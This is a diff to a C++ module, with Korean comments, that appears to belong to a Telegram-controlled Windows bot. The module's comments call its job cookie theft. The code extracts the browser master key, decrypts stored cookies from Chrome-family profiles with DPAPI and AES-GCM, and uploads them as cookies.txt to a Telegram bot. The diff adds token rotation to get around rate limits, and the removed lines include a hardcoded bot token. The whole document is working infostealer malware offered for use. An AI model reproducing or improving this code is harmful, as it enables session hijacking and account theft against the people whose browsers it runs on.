@@ -1,9 +1,8 @@
-﻿// Command_kkkk.cpp (최종 완성본: 모든 오류 수정 및 상세 보고 기능 탑재)
-// 기능: 브라우저 쿠키를 메모리 스트림에 저장 후, 이 파일 내의 전송 함수를 이용해 Telegram으로 직접 전송합니다.
+﻿// Command_cookie.cpp (최종 진단 및 완성본)
 
 #include "Commands.h"
-#include "TelegramApi.h" // SendText 함수만 사용
-#include "Config.h"      // CHAT_ID 참조
+#include "TelegramApi.h" // SendText와 토큰 관리 함수들을 사용
+#include "Config.h"
 
 // --- 기능 구현에 필요한 모든 헤더 ---
 #define NOMINMAX
@@ -14,84 +13,123 @@
 #include <bcrypt.h>
 #include <tlhelp32.h>
 #include <filesystem>
-#include <sstream>       // 메모리 스트림 사용
-#include <fstream>       // ifstream 사용
+#include <sstream>
+#include <fstream>
 #include <string>
 #include <vector>
 #include <map>
-#include "json.hpp"      // 외부 라이브러리
-#include "sqlite3.h"     // 외부 라이브러리
+#include "json.hpp"
+#include "sqlite3.h"
 
 // --- 필요한 라이브러리 링크 ---
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "bcrypt.lib")
-// 중요: sqlite3.lib는 프로젝트 설정에서 직접 추가하거나, sqlite3.c 파일을 프로젝트에 포함해야 합니다.
 
 using json = nlohmann::json;
 using byte = unsigned char;
 
-namespace { // 익명 네임스페이스 (이 파일의 모든 코드를 다른 파일과 격리)
+namespace { // 익명 네임스페이스
+
+    // 로컬 UTF-8 변환 함수
+    static std::string WToUtf8_local(const std::wstring& w) {
+        if (w.empty()) return {};
+        int len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
+        if (len <= 0) return {};
+        std::string out(len, 0);
+        WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &out[0], len, nullptr, nullptr);
+        if (!out.empty() && out.back() == '\0') out.pop_back();
+        return out;
+    }
 
     // =================================================================
-    // 1. 파일 전송 기능 (WinHTTP)
+    // 1. 파일 전송 기능 (토큰 순환 로직 포함)
     // =================================================================
     bool SendDataAsFile(long long chatId, const std::vector<char>& data, const std::wstring& fileName, const std::wstring& caption) {
         if (data.empty()) return false;
 
-        // multipart/form-data 형식의 HTTP 본문 생성
-        std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
-        std::string body;
-        body.reserve(data.size() + 1024);
-        body += "--" + boundary + "\r\n";
-        body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
-        body += std::to_string(chatId) + "\r\n";
-        if (!caption.empty()) { body += "--" + boundary + "\r\n"; body += "Content-Disposition: form-data; name=\"caption\"\r\n\r\n"; body += WToUtf8(caption) + "\r\n"; }
-        body += "--" + boundary + "\r\n";
-        body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + WToUtf8(fileName) + "\"\r\n";
-        body += "Content-Type: application/octet-stream\r\n\r\n";
-        body.append(data.begin(), data.end());
-        body += "\r\n";
-        body += "--" + boundary + "--\r\n";
+        HINTERNET hSession = nullptr, hConnect = nullptr, hRequest = nullptr;
+        BOOL bResult = FALSE;
 
-        // WinHTTP를 사용한 네트워크 요청
-        HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
-        bool ok = false;
+        const char* boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
+        std::string boundary_str = boundary;
 
-        do {
-            hSession = WinHttpOpen(L"CppClient/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
-            if (!hSession) break;
-            WinHttpSetTimeouts(hSession, 30000, 30000, 30000, 30000); // 30초 타임아웃
+        // multipart 본문 생성
+        std::stringstream body_stream;
+        body_stream << "--" << boundary_str << "\r\n";
+        body_stream << "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
+        body_stream << std::to_string(chatId) << "\r\n";
+        if (!caption.empty()) {
+            body_stream << "--" << boundary_str << "\r\n";
+            body_stream << "Content-Disposition: form-data; name=\"caption\"\r\n\r\n";
+            body_stream << WToUtf8_local(caption) << "\r\n";
+        }
+        body_stream << "--" << boundary_str << "\r\n";
+        body_stream << "Content-Disposition: form-data; name=\"document\"; filename=\"" << WToUtf8_local(fileName) << "\"\r\n";
+        body_stream << "Content-Type: application/octet-stream\r\n\r\n";
+
+        std::string header = body_stream.str();
+        std::string footer = "\r\n--" + boundary_str + "--\r\n";
+
+        std::vector<char> request_body;
+        request_body.insert(request_body.end(), header.begin(), header.end());
+        request_body.insert(request_body.end(), data.begin(), data.end());
+        request_body.insert(request_body.end(), footer.begin(), footer.end());
+
+        // TelegramApi.cpp의 토큰 순환 로직을 그대로 사용
+        const size_t max_retries = GetBotTokenCount();
+        if (max_retries == 0) return false;
+
+        for (size_t attempt = 0; attempt < max_retries; ++attempt) {
+            if (hRequest) WinHttpCloseHandle(hRequest);
+            if (hConnect) WinHttpCloseHandle(hConnect);
+            if (hSession) WinHttpCloseHandle(hSession);
+
+            hSession = WinHttpOpen(L"Cookie-FileUploader/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+            if (!hSession) continue;
+
+            WinHttpSetTimeouts(hSession, 0, 60000, 60000, 60000);
+
             hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
-            if (!hConnect) break;
+            if (!hConnect) continue;
 
-            // [404 오류 해결] BOT_TOKEN을 외부에서 참조하지 않고, URL 전체를 직접 하드코딩하여 변수 참조 문제를 원천 차단합니다.
-            std::wstring path = L"/bot8494613693:AAG1cNGBuhuja8Pz5zt5dEcwmgg4PXEZ-y8/sendDocument";
+            // GetCurrentBotToken() 함수로 현재 활성 토큰을 가져옴
+            std::wstring fullPath = L"/bot" + GetCurrentBotToken() + L"/sendDocument";
 
-            hRequest = WinHttpOpenRequest(hConnect, L"POST", path.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-            if (!hRequest) break;
+            hRequest = WinHttpOpenRequest(hConnect, L"POST", fullPath.c_str(), NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+            if (!hRequest) continue;
 
-            std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + std::wstring(boundary.begin(), boundary.end());
-            if (!WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)body.c_str(), (DWORD)body.length(), (DWORD)body.length(), 0)) break;
-            if (!WinHttpReceiveResponse(hRequest, NULL)) break;
+            std::wstring headers = L"Content-Type: multipart/form-data; boundary=" + std::wstring(boundary_str.begin(), boundary_str.end());
 
-            DWORD statusCode = 0;
-            DWORD statusCodeSize = sizeof(statusCode);
-            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &statusCodeSize, NULL);
-            if (statusCode == 200) ok = true;
+            bResult = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.length(), request_body.data(), (DWORD)request_body.size(), (DWORD)request_body.size(), 0);
+            if (!bResult) continue;
 
-        } while (false);
+            bResult = WinHttpReceiveResponse(hRequest, NULL);
+            if (!bResult) continue;
+
+            DWORD dwStatusCode = 0;
+            DWORD dwSize = sizeof(dwStatusCode);
+            WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwSize, NULL);
+
+            if (dwStatusCode == 429) { // Too Many Requests 오류 시
+                RotateToNextBotToken(); // 다음 토큰으로 교체
+                if (attempt < max_retries - 1) continue;
+            }
+
+            bResult = (dwStatusCode == 200); // 200 OK일 때만 성공으로 간주하고 루프 탈출
+            break;
+        }
 
         if (hRequest) WinHttpCloseHandle(hRequest);
         if (hConnect) WinHttpCloseHandle(hConnect);
         if (hSession) WinHttpCloseHandle(hSession);
 
-        return ok;
+        return bResult;
     }
 
     // =================================================================
-    // 2. 쿠키 탈취 기능 (상세 오류 보고)
+    // 2. 쿠키 탈취 기능 (최종 진단 로그 포함)
     // =================================================================
     namespace BrowserData {
 
@@ -115,15 +153,11 @@ namespace { // 익명 네임스페이스 (이 파일의 모든 코드를 다른 
                 LocalFree(output.pbData);
                 return true;
             }
-            SendText(CHAT_ID, WToUtf8(L"❌ DPAPI 복호화 실패! GetLastError(): " + std::to_wstring(GetLastError())));
             return false;
         }
 
         std::string DecryptAES_GCM(const std::vector<byte>& key, const std::vector<byte>& data) {
-            if (data.size() < 18 || (data[0] != 'v' || data[1] != '1' || (data[2] != '0' && data[2] != '1'))) {
-                return "";
-            }
-
+            if (data.size() < 18 || (data[0] != 'v' || data[1] != '1' || (data[2] != '0' && data[2] != '1'))) return "";
             std::vector<byte> nonce(data.begin() + 3, data.begin() + 15);
             std::vector<byte> ciphertext(data.begin() + 15, data.end());
             if (ciphertext.size() <= 16) return "";
@@ -131,17 +165,11 @@ namespace { // 익명 네임스페이스 (이 파일의 모든 코드를 다른 
             BCRYPT_ALG_HANDLE hAlg = NULL;
             BCRYPT_KEY_HANDLE hKey = NULL;
             std::string decrypted_text;
-            NTSTATUS status = 0;
 
             do {
-                status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
-                if (!BCRYPT_SUCCESS(status)) { SendText(CHAT_ID, WToUtf8(L"❌ BCryptOpenAlgorithmProvider 실패! NTSTATUS: " + std::to_wstring(status))); break; }
-
-                status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
-                if (!BCRYPT_SUCCESS(status)) { SendText(CHAT_ID, WToUtf8(L"❌ BCryptSetProperty 실패! NTSTATUS: " + std::to_wstring(status))); break; }
-
-                status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)key.data(), (ULONG)key.size(), 0);
-                if (!BCRYPT_SUCCESS(status)) { SendText(CHAT_ID, WToUtf8(L"❌ BCryptGenerateSymmetricKey 실패! NTSTATUS: " + std::to_wstring(status))); break; }
+                if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0))) break;
+                if (!BCRYPT_SUCCESS(BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0))) break;
+                if (!BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PBYTE)key.data(), (ULONG)key.size(), 0))) break;
 
                 BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
                 RtlZeroMemory(&auth_info, sizeof(auth_info));
@@ -153,12 +181,22 @@ namespace { // 익명 네임스페이스 (이 파일의 모든 코드를 다른 
                 auth_info.cbTag = 16;
 
                 ULONG decrypted_len = 0;
-                status = BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size() - 16, &auth_info, NULL, 0, NULL, 0, &decrypted_len, 0);
-                if (!BCRYPT_SUCCESS(status) || decrypted_len == 0) break;
+                std::vector<byte> buffer(ciphertext.size());
+                NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size() - 16, &auth_info, NULL, 0, buffer.data(), (ULONG)buffer.size(), &decrypted_len, 0);
 
-                std::vector<byte> buffer(decrypted_len);
-                status = BCryptDecrypt(hKey, (PUCHAR)ciphertext.data(), (ULONG)ciphertext.size() - 16, &auth_info, NULL, 0, buffer.data(), (ULONG)buffer.size(), &decrypted_len, 0);
-                if (BCRYPT_SUCCESS(status)) decrypted_text.assign(buffer.begin(), buffer.end());
+                // BCryptDecrypt 함수의 결과를 무조건 첫 한 번만 로깅합니다.
+                static bool decrypt_info_sent = false;
+                if (!decrypt_info_sent) {
+                    std::stringstream ss;
+                    ss << "🔬 BCryptDecrypt First Result -> NTSTATUS: 0x" << std::hex << status
+                        << ", Decrypted Length: " << std::dec << decrypted_len;
+                    SendText(CHAT_ID, ss.str());
+                    decrypt_info_sent = true;
+                }
+
+                if (BCRYPT_SUCCESS(status) && decrypted_len > 0) {
+                    decrypted_text.assign(buffer.begin(), buffer.begin() + decrypted_len);
+                }
 
             } while (false);
 
@@ -178,10 +216,8 @@ namespace { // 익명 네임스페이스 (이 파일의 모든 코드를 다른 
 
                     std::vector<byte> key;
                     if (!GetMasterKey(path / "Local State", key)) {
-                        SendText(CHAT_ID, WToUtf8(L"❌ [" + name + L"] 마스터 키 획득 최종 실패."));
                         continue;
                     }
-
                     std::vector<std::wstring> profiles = { L"Default", L"Profile 1", L"Profile 2", L"Profile 3", L"Profile 4", L"Profile 5" };
                     for (const auto& profile : profiles) ExtractFrom(name, path, profile, key);
                 }
@@ -191,6 +227,27 @@ namespace { // 익명 네임스페이스 (이 파일의 모든 코드를 다른 
             std::filesystem::path m_local_appdata, m_roaming_appdata;
             std::map<std::wstring, std::filesystem::path> m_browser_paths;
             std::stringstream m_output_stream;
+
+            bool GetMasterKey(const std::filesystem::path& path, std::vector<byte>& masterKey) {
+                if (!std::filesystem::exists(path)) return false;
+
+                std::ifstream f(path, std::ios::binary);
+                json state;
+                try { f >> state; }
+                catch (...) { return false; }
+
+                if (!state.contains("os_crypt") || !state["os_crypt"].contains("encrypted_key")) {
+                    return false;
+                }
+
+                auto key_b64 = Base64Decode(state["os_crypt"]["encrypted_key"]);
+                if (key_b64.size() <= 5) {
+                    return false;
+                }
+
+                std::vector<byte> key_encrypted(key_b64.begin() + 5, key_b64.end());
+                return DecryptDPAPI(key_encrypted, masterKey);
+            }
 
             void LocatePaths() {
                 PWSTR p = nullptr;
@@ -221,30 +278,6 @@ namespace { // 익명 네임스페이스 (이 파일의 모든 코드를 다른 
                 CloseHandle(snap);
             }
 
-            bool GetMasterKey(const std::filesystem::path& path, std::vector<byte>& masterKey) {
-                if (!std::filesystem::exists(path)) return false;
-
-                std::ifstream f(path);
-                json state;
-                try { f >> state; }
-                catch (const json::parse_error& e) {
-                    std::string err = "❌ Local State JSON 파싱 실패: "; err += e.what();
-                    SendText(CHAT_ID, err);
-                    return false;
-                }
-
-                if (!state.contains("os_crypt") || !state["os_crypt"].contains("encrypted_key")) {
-                    SendText(CHAT_ID, WToUtf8(L"❌ Local State 파일에 encrypted_key가 없습니다."));
-                    return false;
-                }
-
-                auto key_b64 = Base64Decode(state["os_crypt"]["encrypted_key"]);
-                if (key_b64.size() <= 5) return false;
-
-                std::vector<byte> key_encrypted(key_b64.begin() + 5, key_b64.end());
-                return DecryptDPAPI(key_encrypted, masterKey);
-            }
-
             void ExtractFrom(const std::wstring& name, const std::filesystem::path& path, const std::wstring& profile, const std::vector<byte>& key) {
                 std::filesystem::path db_path = path / profile / "Network" / "Cookies";
                 if (name == L"Opera") db_path = path / "Network" / "Cookies";
@@ -262,7 +295,7 @@ namespace { // 익명 네임스페이스 (이 파일의 모든 코드를 다른 
 
                 sqlite3_stmt* stmt;
                 if (sqlite3_prepare_v2(db, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies", -1, &stmt, NULL) == SQLITE_OK) {
-                    m_output_stream << "\n# Browser: " << WToUtf8(name) << " | Profile: " << WToUtf8(profile) << "\n";
+                    m_output_stream << "\n# Browser: " << WToUtf8_local(name) << " | Profile: " << WToUtf8_local(profile) << "\n";
                     int processed = 0, decrypted = 0;
                     while (sqlite3_step(stmt) == SQLITE_ROW) {
                         processed++;
@@ -278,63 +311,50 @@ namespace { // 익명 네임스페이스 (이 파일의 모든 코드를 다른 
                             m_output_stream << host << "\tTRUE\t" << cpath << "\tFALSE\t" << expires << "\t" << cname << "\t" << dec << "\n";
                         }
                     }
-                    std::wstring log = L"[" + name + L"/" + profile + L"] 처리: " + std::to_wstring(processed) + L", 성공: " + std::to_wstring(decrypted);
-                    SendText(CHAT_ID, WToUtf8(log));
+                    std::wstring log = L"[" + name + L"/" + profile + L"] Processed: " + std::to_wstring(processed) + L", Succeeded: " + std::to_wstring(decrypted);
+                    SendText(CHAT_ID, WToUtf8_local(log));
                 }
-
                 sqlite3_finalize(stmt);
                 sqlite3_close(db);
                 std::filesystem::remove(temp_db);
             }
         };
-    } // namespace BrowserData
+    }
 
     // =================================================================
     // 3. 텔레그램 명령어 핸들러
     // =================================================================
-    static bool KkkkHandler(long long chatId, const std::string& hwid8, const std::string& argsUtf8) {
-        SendText(chatId, WToUtf8(L"⏳ 쿠키 탈취 및 상세 분석 시작..."));
+    static bool CookieHandler(long long chatId, const std::string& hwid8, const std::string& argsUtf8) {
+        SendText(chatId, "⏳ Cookie extraction and analysis starting (Final Diagnostic)...");
 
         BrowserData::Extractor extractor;
         std::string cookie_data_str = extractor.Run();
 
-        if (cookie_data_str.empty()) {
-            SendText(chatId, WToUtf8(L"❌ 최종 결과: 추출된 데이터가 없습니다."));
+        if (cookie_data_str.empty() || cookie_data_str.find('\n') == std::string::npos) {
+            SendText(chatId, "❌ Final Result: No data extracted.");
             return true;
         }
 
         std::vector<char> data(cookie_data_str.begin(), cookie_data_str.end());
 
-        std::wstring report = L"✅ 추출 완료. 전송 파일 크기: " + std::to_wstring(data.size()) + L" 바이트";
-        SendText(chatId, WToUtf8(report));
+        std::wstring report = L"✅ Extraction complete. File size: " + std::to_wstring(data.size()) + L" bytes";
+        SendText(chatId, WToUtf8_local(report));
 
-        if (SendDataAsFile(chatId, data, L"cookies.txt", L"🍪 탈취된 쿠키 목록입니다.")) {
-            SendText(chatId, WToUtf8(L"✅ 파일 전송 성공!"));
+        if (SendDataAsFile(chatId, data, L"cookies.txt", L"🍪 Cookie list retrieved.")) {
+            SendText(chatId, "✅ File sent successfully!");
         }
         else {
-            SendText(chatId, WToUtf8(L"❌ 파일 전송에 실패했습니다."));
+            SendText(chatId, "❌ File transfer failed. All tokens might be rate-limited.");
         }
-
         return true;
     }
 
-    // =================================================================
-    // 4. 명령어 자동 등록
-    // =================================================================
-    struct KkkkCommandRegistrar {
-        KkkkCommandRegistrar() {
-            RegisterCommand("kkkk", KkkkHandler);
+    // 명령어 자동 등록
+    struct CookieCommandRegistrar {
+        CookieCommandRegistrar() {
+            RegisterCommand("cookie", CookieHandler);
         }
     };
-    static KkkkCommandRegistrar g_kkkkRegistrar;
+    static CookieCommandRegistrar g_cookieRegistrar;
 
 } // 익명 네임스페이스 종료
-static std::string WToUtf8(const std::wstring& w) {
-    if (w.empty()) return {};
-    int len = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
-    if (len <= 0) return {};
-    std::string out(len, 0);
-    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &out[0], len, nullptr, nullptr);
-    if (!out.empty() && out.back() == '\0') out.pop_back();
-    return out;
-}
